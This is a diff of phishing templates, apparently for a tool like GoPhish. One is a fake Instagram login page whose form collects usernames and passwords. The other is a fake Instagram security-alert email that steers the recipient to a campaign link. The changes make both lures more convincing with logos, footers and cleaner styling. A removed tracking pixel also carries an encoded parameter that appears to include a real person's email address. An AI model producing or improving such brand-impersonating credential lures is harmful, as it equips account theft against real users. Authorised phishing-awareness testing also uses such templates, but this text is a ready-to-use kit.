@@ -125,18 +125,26 @@ HTML:
             justify-content: center;
             align-items: center;
             height: 100vh;
+            padding: 20px;
         }
         .login-box {
-            width: 350px;
+            width: 100%;
+            max-width: 360px;
             padding: 20px;
             background: white;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
+        }
+        .login-box img {
+            width: 100px;
+            margin-bottom: 20px;
         }
         .login-box h2 {
             margin-bottom: 20px;
             color: #262626;
+            font-size: 24px;
+            font-weight: bold;
         }
         .input-group {
             margin-bottom: 15px;
@@ -145,24 +153,25 @@ HTML:
             display: block;
             font-size: 14px;
             margin-bottom: 5px;
-            color: #262626;
+            color: #333;
         }
         .input-group input {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #dbdbdb;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 16px;
         }
         .login-button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #3897f0;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
+            font-weight: bold;
         }
         .login-button:hover {
             background-color: #2a77d1;
@@ -178,11 +187,18 @@ HTML:
         .forgot-password:hover {
             text-decoration: underline;
         }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo"/>
             <h2>Log into Instagram</h2>
             <form action="" method="post">
                 <div class="input-group">
@@ -196,6 +212,9 @@ HTML:
                 <button type="submit" class="login-button">Log In</button>
             </form>
             <a href="#" class="forgot-password">Forgot password?</a>
+            <div class="footer">
+                <p>Don&#39;t have an account? <a href="#">Sign up</a></p>
+            </div>
         </div>
     </div>
 
@@ -222,131 +241,118 @@ EMAIL TEMPLATES
 
 HTML:
 
-<div dir="ltr" style="margin: 0; padding: 0;">
-   <table id="email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
-      <tbody>
-         <tr>
-            <td id="email_content" style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background: #ffffff;">
-               <table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
-                  <tbody>
-                     <tr>
-                        <td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
-                     </tr>
-                     <tr>
-                        <td style="line-height: 1px;" colspan="3" height="1">&nbsp;</td>
-                     </tr>
-                     <tr>
-                        <td>
-                           <table style="border-collapse: collapse; border: solid 1px white; margin: 0 auto 5px auto; padding: 3px 0; text-align: center; width: 430px;" width="100%" cellspacing="0" cellpadding="0">
-                              <tbody>
-                                 <tr>
-                                    <td style="width: 15px;" width="15px">&nbsp;</td>
-                                    <td style="line-height: 0px; width: 400px; padding: 0 0 15px 0;">
-                                       <table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
-                                          <tbody>
-                                             <tr>
-                                                <td style="width: 100%; text-align: left; height: 33px;">
-                                                   <img style="border: 0;" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/8H69VFStPBK.png" height="33" alt="Instagram Logo" />
-                                                </td>
-                                             </tr>
-                                          </tbody>
-                                       </table>
-                                    </td>
-                                    <td style="width: 15px;" width="15px">&nbsp;</td>
-                                 </tr>
-                                 <tr>
-                                    <td style="width: 15px;" width="15px">&nbsp;</td>
-                                    <td style="border-top: solid 1px #c8c8c8;">&nbsp;</td>
-                                    <td style="width: 15px;" width="15px">&nbsp;</td>
-                                 </tr>
-                              </tbody>
-                           </table>
-                        </td>
-                     </tr>
-                     <tr>
-                        <td>
-                           <table style="border-collapse: collapse; margin: 0 auto 0 auto;" width="430" cellspacing="0" cellpadding="0">
-                              <tbody>
-                                 <tr>
-                                    <td>
-                                       <table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
-                                          <tbody>
-                                             <tr>
-                                                <td style="display: block; width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
-                                             </tr>
-                                             <tr>
-                                                <td>
-                                                   <table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
-                                                      <tbody>
-                                                         <tr>
-                                                            <td>
-                                                               <table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
-                                                                  <tbody>
-                                                                     <tr>
-                                                                        <td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
-                                                                        <td>
-                                                                           <table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
-                                                                              <tbody>
-                                                                                 <tr>
-                                                                                    <td>
-                                                                                       <p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Hi {{.FirstName}},</p>
-                                                                                       <p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Someone tried to log in to your Instagram account from a new location.</p>
-                                                                                       <p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this was you, please use the following code to log in:</p>
-                                                                                       <p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;"><span style="font-size: xx-large;">823013</span></p>
-                                                                                       <p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">If this wasn't you, please <a style="color: #3897f0; text-decoration: none;" href="{{.URL}}" target="_blank" rel="noopener">reset your password</a> to secure your account.</p>
-                                                                                    </td>
-                                                                                 </tr>
-                                                                              </tbody>
-                                                                           </table>
-                                                                        </td>
-                                                                        <td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
-                                                                     </tr>
-                                                                  </tbody>
-                                                               </table>
-                                                            </td>
-                                                         </tr>
-                                                      </tbody>
-                                                   </table>
-                                                </td>
-                                             </tr>
-                                          </tbody>
-                                       </table>
-                                    </td>
-                                 </tr>
-                              </tbody>
-                           </table>
-                        </td>
-                     </tr>
-                     <tr>
-                        <td>
-                           <table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
-                              <tbody>
-                                 <tr>
-                                    <td style="line-height: 30px;" colspan="3" height="30">&nbsp;</td>
-                                 </tr>
-                                 <tr>
-                                    <td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
-                                    <td>
-                                       <div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">&copy; Instagram, Menlo Park, CA 94025</div>
-                                       <div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">This message was sent to <a style="color: #abadae; text-decoration: underline;">{{.FirstName}}</a> and intended for {{.Email}}. Not your account? <a style="color: #abadae; text-decoration: underline;" target="_blank" rel="noopener">Remove your email</a> from this account.</div>
-                                    </td>
-                                    <td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
-                                 </tr>
-                              </tbody>
-                           </table>
-                        </td>
-                     </tr>
-                     <tr>
-                        <td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
-                     </tr>
-                  </tbody>
-               </table>
-               <img style="border: 0; width: 1px; height: 1px;" src="https://www.instagram.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" />
-            </td>
-         </tr>
-      </tbody>
-   </table>
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Instagram Security Alert</title>
+	<style type="text/css">body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .email-content {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid #e2e2e2;
+        }
+        .header img {
+            width: 150px;
+            height: auto;
+        }
+        .body {
+            padding: 20px;
+        }
+        .body p {
+            margin: 0 0 15px;
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .code {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            display: block;
+            margin: 20px 0;
+            text-align: center;
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 6px;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 20px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #3897f0;
+            text-decoration: none;
+            border-radius: 6px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .button:hover {
+            background-color: #2a77d1;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #777;
+            border-top: 1px solid #e2e2e2;
+        }
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+	</style>
+</head>
+<body>
+<div class="container">
+<div class="email-content">
+<div class="header"><img alt="Instagram Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" /></div>
+
+<div class="body">
+<p>Hi {{.FirstName}},</p>
+
+<p>We noticed a login to your Instagram account from a new device or location. If this was you, please use the code below to verify this activity:</p>
+
+<p class="code">123456</p>
+
+<p>If you did not attempt this login, please <a class="button" href="{{.URL}}" rel="noopener" target="_blank">secure your account</a> by changing your password immediately.</p>
+
+<p>If you need further assistance, visit our <a href="https://help.instagram.com" rel="noopener" target="_blank">Help Center</a>.</p>
 </div>
+
+<div class="footer">
+<p>&copy; 2024 Instagram, Inc. 1601 Willow Road, Menlo Park, CA 94025</p>
+
+<p>This email was sent to <a href="mailto:{{.Email}}">{{.Email}}</a>. If you did not request this, please disregard this email. <a href="#">Unsubscribe</a></p>
+</div>
+</div>
+</div>
+</body>
+</html>
+
 
 *******************************************************************
 
